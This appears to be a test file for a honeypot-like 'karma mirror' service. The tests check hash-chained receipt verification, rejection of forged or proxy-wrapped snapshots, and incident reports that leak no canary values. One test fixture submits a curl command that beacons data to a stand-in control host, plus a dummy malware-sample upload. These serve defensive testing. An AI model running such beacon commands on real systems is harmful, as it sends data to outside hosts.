import { createHash } from "node:crypto";
import { describe, expect, test } from "bun:test";

import {
  KARMA_TEND_REPORT_SCHEMA,
  KarmaMirror,
  buildKarmaTendReport,
  mintMirrorCredential,
  verifyReceiptSnapshot,
  type KarmaReceipt,
  type KarmaReceiptSnapshot,
} from "../src/index.js";
import { fixture, mirrorRequest } from "./helpers.js";

function hashReceipt(receipt: Omit<KarmaReceipt, "event_hash">): string {
  return createHash("sha256")
    .update(`agenttool.karma-mirror-receipt/v1\0${JSON.stringify(receipt)}`)
    .digest("hex");
}

function rehashSingleReceipt(
  snapshot: KarmaReceiptSnapshot,
  mutate: (receipt: Record<string, unknown>) => void,
): KarmaReceiptSnapshot {
  const receipt = { ...snapshot.receipts[0] } as Record<string, unknown>;
  mutate(receipt);
  const { event_hash: _oldHash, ...withoutHash } = receipt;
  receipt.event_hash = hashReceipt(withoutHash as Omit<KarmaReceipt, "event_hash">);
  return {
    ...snapshot,
    head_event_hash: receipt.event_hash as string,
    receipts: [receipt as unknown as KarmaReceipt],
  };
}

async function recordWake(mirror: KarmaMirror, key: string, count = 1): Promise<void> {
  for (let index = 0; index < count; index += 1) {
    const response = await mirror.handle(mirrorRequest("/v1/wake", { token: key }));
    expect(response.status).toBe(200);
  }
}

describe("strict receipt verification", () => {
  test("rejects recomputed chains with extra fields, invalid enums, or misplaced evidence", async () => {
    const { key, mirror } = fixture();
    await recordWake(mirror, key);
    const source = mirror.receiptSnapshot();
    const forgedZeroAnchorSuffix = rehashSingleReceipt(source, (receipt) => {
      receipt.sequence = 2;
      receipt.previous_event_hash = "0".repeat(64);
    });
    forgedZeroAnchorSuffix.total_events_seen = 2;

    const cases = [
      rehashSingleReceipt(source, (receipt) => {
        receipt.authorization = "Bearer private-canary";
      }),
      rehashSingleReceipt(source, (receipt) => {
        receipt.room = "definitely-not-a-room";
      }),
      rehashSingleReceipt(source, (receipt) => {
        receipt.evidence = { raw_body: "private-body" };
      }),
      rehashSingleReceipt(source, (receipt) => {
        receipt.occurred_at = "not-a-time";
      }),
      rehashSingleReceipt(source, (receipt) => {
        receipt.evidence = { execute_class: "network_beacon" };
      }),
      rehashSingleReceipt(source, (receipt) => {
        receipt.evidence = { execute_class: undefined };
      }),
      rehashSingleReceipt(source, (receipt) => {
        Object.defineProperty(receipt, "hidden", {
          enumerable: false,
          value: "private-canary",
        });
      }),
      rehashSingleReceipt(source, (receipt) => {
        Reflect.set(receipt, Symbol("private-canary"), true);
      }),
      forgedZeroAnchorSuffix,
    ];

    for (const forged of cases) {
      expect(verifyReceiptSnapshot(forged)).toBe(false);
      expect(() => buildKarmaTendReport({
        placement: "fixture-drawer",
        snapshot: forged,
      })).toThrow("tend_receipt_snapshot_failed_verification");
    }
  });

  test("rejects accessors without invoking them and contains hostile proxy failures", async () => {
    const { key, mirror } = fixture();
    await recordWake(mirror, key);
    const snapshot = mirror.receiptSnapshot();
    let getterCalls = 0;
    Object.defineProperty(snapshot.receipts[0], "authorization", {
      enumerable: true,
      get() {
        getterCalls += 1;
        return "private-canary";
      },
    });
    expect(verifyReceiptSnapshot(snapshot)).toBe(false);
    expect(getterCalls).toBe(0);

    const hostile = new Proxy(mirror.receiptSnapshot(), {
      ownKeys() {
        throw new Error("private proxy failure");
      },
    });
    expect(verifyReceiptSnapshot(hostile)).toBe(false);
    expect(() => buildKarmaTendReport({
      placement: "fixture-drawer",
      snapshot: hostile,
    })).toThrow("tend_receipt_snapshot_failed_verification");
  });

  test("rejects descriptor-valid proxies without invoking ordinary property reads", async () => {
    const { key, mirror } = fixture();
    await recordWake(mirror, key);
    const snapshot = mirror.receiptSnapshot();
    let getCalls = 0;
    const proxy = new Proxy(snapshot, {
      get(target, property, receiver) {
        getCalls += 1;
        return Reflect.get(target, property, receiver);
      },
    });
    expect(verifyReceiptSnapshot(proxy)).toBe(false);
    expect(() => buildKarmaTendReport({
      placement: "fixture-drawer",
      snapshot: proxy,
    })).toThrow("tend_receipt_snapshot_failed_verification");
    expect(getCalls).toBe(0);

    snapshot.receipts[0] = new Proxy(snapshot.receipts[0]!, {
      get(target, property, receiver) {
        getCalls += 1;
        return Reflect.get(target, property, receiver);
      },
    });
    expect(verifyReceiptSnapshot(snapshot)).toBe(false);
    expect(getCalls).toBe(0);
  });
});

describe("TEND incident clarity", () => {
  test("describes an empty window without claiming absence or incident", () => {
    const { mirror } = fixture();
    const report = mirror.incidentClarityReport();
    expect(report).toMatchObject({
      schema: KARMA_TEND_REPORT_SCHEMA,
      method: "TEND",
      incident_status: "not_established",
      trace: {
        coverage: "empty",
        retained_volume: "zero",
        interaction_families: [],
        response_shapes: [],
        stable_identifiers_disclosed: false,
      },
      explain: {
        status: "no_admitted_interaction_recorded",
        attention: "observation_gap",
      },
      narrow: {
        review_disposition: "confirm_observation_path",
        automatic_actions_taken: false,
      },
      distill: {
        status: "no_lesson_yet",
        candidate_lessons: [],
        training_label: false,
      },
      non_claims: {
        claims_incident: false,
        claims_complete_timeline: false,
      },
    });
    expect(report.explain.summary).toContain("does not establish absence");
  });

  test("turns closed events into a calm manual review without copying sensitive evidence", async () => {
    const { key, mirror } = fixture();
    await mirror.handle(mirrorRequest("/v1/keys", { token: key }));
    await mirror.handle(mirrorRequest("/v1/execute", {
      token: key,
      method: "POST",
      body: JSON.stringify({
        language: "bash",
        code: "curl https://private-control.example/collect?payload=BODY_CANARY",
      }),
      headers: {
        "user-agent": "PRIVATE_UA_CANARY",
        cookie: "PRIVATE_COOKIE_CANARY",
        referer: "https://private-referrer.example/PRIVATE_REFERRER_CANARY",
        "x-forwarded-for": "192.0.2.99",
      },
    }));
    const sample = Buffer.from("PRIVATE_SAMPLE_CANARY");
    await mirror.handle(mirrorRequest("/v1/malware", {
      token: key,
      method: "POST",
      body: JSON.stringify({
        filename: "PRIVATE_FILENAME_CANARY",
        sample_b64: sample.toString("base64"),
      }),
    }));

    const snapshot = mirror.receiptSnapshot();
    const report = mirror.incidentClarityReport();
    expect(report.trace).toMatchObject({
      coverage: "starts_at_first_receipt",
      retained_volume: "two_to_four",
      interaction_families: [
        "credential_operations",
        "execution_emulation",
        "artifact_emulation",
      ],
      response_shapes: ["synthetic_response_returned"],
      request_pattern_classes: ["network_beacon"],
    });
    expect(report.explain.attention).toBe("boundary_review");
    expect(report.narrow.suggested_actions).toContain("verify_isolation_boundary");
    expect(report.narrow.suggested_actions).toContain(
      "compare_digest_only_with_authorized_evidence",
    );
    expect(report.distill.future_control_checks).toContain("verify_egress_denial");
    expect(report.distill.future_control_checks).toContain(
      "verify_artifact_minimization",
    );

    const encoded = JSON.stringify(report);
    const sourceValues = [
      key,
      "fixture-drawer",
      "BODY_CANARY",
      "PRIVATE_UA_CANARY",
      "PRIVATE_COOKIE_CANARY",
      "PRIVATE_REFERRER_CANARY",
      "PRIVATE_FILENAME_CANARY",
      "PRIVATE_SAMPLE_CANARY",
      "192.0.2.99",
      ...snapshot.receipts.flatMap((receipt) => [
        receipt.event_hash,
        receipt.previous_event_hash,
        receipt.occurred_at,
        receipt.evidence.artifact_sha256 ?? "",
      ]),
      snapshot.anchor_before_first,
      snapshot.head_event_hash,
    ].filter((value) => value.length > 0 && value !== "0".repeat(64));
    for (const value of sourceValues) expect(encoded).not.toContain(value);
    for (const storyText of [
      "Skyseed Commons",
      "Yoinkseed",
      "Copybara",
      "Building Castles in the Sky",
    ]) expect(encoded).not.toContain(storyText);
    expect(encoded.length).toBeLessThan(8_000);
  });

  test("keeps a classless execution refusal unclassified", async () => {
    const { key, mirror } = fixture();
    const response = await mirror.handle(mirrorRequest("/v1/execute", {
      token: key,
      method: "POST",
      body: "{",
    }));
    expect(response.status).toBe(400);
    const report = mirror.incidentClarityReport();
    expect(report.trace.interaction_families).toEqual(["execution_emulation"]);
    expect(report.trace.response_shapes).toEqual(["mirror_refusal_returned"]);
    expect(report.trace.request_pattern_classes).toEqual([]);
    expect(report.trace.unclassified_execution_refusal_observed).toBe(true);
    expect(report.explain.observed).toContain(
      "unclassified_execution_refusal_observed",
    );
  });

  test("is canonical across roots, clocks, event order, and private request material", async () => {
    const first = mintMirrorCredential({ placement: "private-root-a" });
    const second = mintMirrorCredential({ placement: "private-root-b" });
    let firstTick = 0;
    let secondTick = 0;
    const firstMirror = new KarmaMirror({
      credentials: [first.record],
      now: () => new Date(Date.UTC(2026, 0, 1, 0, 0, firstTick++)),
    });
    const secondMirror = new KarmaMirror({
      credentials: [second.record],
      now: () => new Date(Date.UTC(2030, 5, 1, 0, 0, secondTick++)),
    });
    await firstMirror.handle(mirrorRequest("/v1/wake", { token: first.key }));
    await firstMirror.handle(mirrorRequest("/v1/keys", { token: first.key }));
    await secondMirror.handle(mirrorRequest("/v1/keys", { token: second.key }));
    await secondMirror.handle(mirrorRequest("/v1/wake", { token: second.key }));

    expect(JSON.stringify(firstMirror.incidentClarityReport())).toBe(
      JSON.stringify(secondMirror.incidentClarityReport()),
    );
  });

  test("does not turn artifact digests or placement into report fingerprints", async () => {
    const first = mintMirrorCredential({ placement: "artifact-private-a" });
    const second = mintMirrorCredential({ placement: "artifact-private-b" });
    const firstMirror = new KarmaMirror({ credentials: [first.record] });
    const secondMirror = new KarmaMirror({ credentials: [second.record] });
    await firstMirror.handle(mirrorRequest("/v1/malware", {
      token: first.key,
      method: "POST",
      body: JSON.stringify({ sample_b64: Buffer.from("artifact-a").toString("base64") }),
    }));
    await secondMirror.handle(mirrorRequest("/v1/malware", {
      token: second.key,
      method: "POST",
      body: JSON.stringify({ sample_b64: Buffer.from("artifact-b").toString("base64") }),
    }));
    expect(JSON.stringify(firstMirror.incidentClarityReport())).toBe(
      JSON.stringify(secondMirror.incidentClarityReport()),
    );
  });

  test("buckets volume and states truncation without inventing evicted categories", async () => {
    const seventeen = fixture();
    await recordWake(seventeen.mirror, seventeen.key, 17);
    expect(seventeen.mirror.incidentClarityReport().trace.retained_volume).toBe(
      "seventeen_plus",
    );
    const fiveHundred = fixture();
    await recordWake(fiveHundred.mirror, fiveHundred.key, 500);
    expect(JSON.stringify(fiveHundred.mirror.incidentClarityReport())).toBe(
      JSON.stringify(seventeen.mirror.incidentClarityReport()),
    );

    const truncated = fixture({ maxReceipts: 2 });
    await recordWake(truncated.mirror, truncated.key, 5);
    const report = truncated.mirror.incidentClarityReport();
    expect(report.trace).toMatchObject({
      coverage: "retained_suffix",
      retained_volume: "two_to_four",
      interaction_families: ["capability_discovery"],
    });
    expect(report.explain.observed).toContain("receipt_window_truncated");
    expect(report.distill.candidate_lessons).toContain(
      "receipt_retention_was_partial",
    );
    expect(JSON.stringify(report)).not.toContain("total_events_seen");
  });

  test("records exit as a response shape, not repentance or identity", async () => {
    const { key, mirror } = fixture();
    await recordWake(mirror, key);
    await mirror.handle(mirrorRequest("/v1/karma/exit", {
      token: key,
      method: "POST",
    }));
    const before = JSON.stringify(mirror.receiptSnapshot());
    const report = mirror.incidentClarityReport();
    expect(report.trace.response_shapes).toContain("constructive_exit_recorded");
    expect(report.explain.status).toBe("constructive_exit_recorded");
    expect(report.narrow.review_disposition).toBe("honor_exit_and_review");
    expect(report.narrow.suggested_actions).toContain("honor_constructive_exit");
    expect(report.non_claims.claims_request_purpose).toBe(false);
    expect(report.non_claims.grants_transfer_authority).toBe(false);
    expect(JSON.stringify(mirror.receiptSnapshot())).toBe(before);
  });

  test("requires one selected placement and returns fresh projections", async () => {
    const first = mintMirrorCredential({ placement: "drawer-a" });
    const second = mintMirrorCredential({ placement: "drawer-b" });
    const mirror = new KarmaMirror({ credentials: [first.record, second.record] });
    await recordWake(mirror, second.key);
    expect(() => mirror.incidentClarityReport()).toThrow("placement is required");
    const firstReport = mirror.incidentClarityReport("drawer-b");
    firstReport.trace.interaction_families.push("artifact_emulation");
    expect(mirror.incidentClarityReport("drawer-b").trace.interaction_families)
      .toEqual(["capability_discovery"]);
    expect(() => buildKarmaTendReport({
      placement: "drawer-a",
      snapshot: mirror.receiptSnapshot("drawer-b"),
    })).toThrow("tend_placement_mismatch");
  });

  test("uses value-free errors for rejected secret-bearing input", () => {
    const firstCanary = "FIRST_PRIVATE_CANARY";
    const secondCanary = "SECOND_PRIVATE_CANARY";
    const messages = [firstCanary, secondCanary].map((canary) => {
      try {
        buildKarmaTendReport({
          placement: "fixture-drawer",
          snapshot: { secret: canary } as unknown as KarmaReceiptSnapshot,
        });
      } catch (error) {
        return (error as Error).message;
      }
      throw new Error("invalid input unexpectedly produced a report");
    });
    expect(messages).toEqual([
      "tend_receipt_snapshot_failed_verification",
      "tend_receipt_snapshot_failed_verification",
    ]);
    expect(messages.join(" ")).not.toContain("PRIVATE_CANARY");
  });
});
